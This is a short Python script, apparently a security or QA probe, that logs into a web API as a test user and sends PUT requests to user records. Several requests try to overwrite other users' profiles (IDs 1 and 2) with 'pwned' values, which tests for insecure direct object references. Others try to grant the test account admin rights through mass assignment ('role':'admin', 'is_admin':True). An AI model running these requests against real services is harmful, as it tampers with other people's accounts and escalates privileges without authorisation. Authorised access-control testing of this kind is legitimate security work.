import requests, json
base="https://<host>/ooklakappa"
s=requests.Session(); s.headers.update({"User-Agent":"Mozilla/5.0","Accept":"application/json"})
tok=s.post(base+"/api/login",json={"username":"qa_probe_1","password":"Probe12345!"},timeout=20).json()["token"]
H={"Authorization":"Bearer "+tok}
def call(tag,m,p,**kw):
    r=s.request(m,base+p,headers=H,timeout=20,**kw)
    print("===",tag,r.status_code,r.text[:500]); return r
call("PUT self email","PUT","/api/users/320",json={"email":"usuario@example.com"})
call("PUT self bio","PUT","/api/users/320",json={"bio":"hola"})
call("PUT self username","PUT","/api/users/320",json={"username":"qa_probe_1b"})
call("GET self","GET","/api/users/320")
call("PUT other 1 bio","PUT","/api/users/1",json={"bio":"pwned"})
call("PUT other 1 email","PUT","/api/users/1",json={"email":"pwned@x"})
call("PUT other 2","PUT","/api/users/2",json={"bio":"pwned"})
call("PUT self nested","PUT","/api/users/320",json={"user":{"role":"admin"}})
call("PUT self is_admin","PUT","/api/users/320",json={"is_admin":True})
call("PUT self role+email","PUT","/api/users/320",json={"email":"a@b.c","role":"admin"})
call("GET self","GET","/api/users/320")
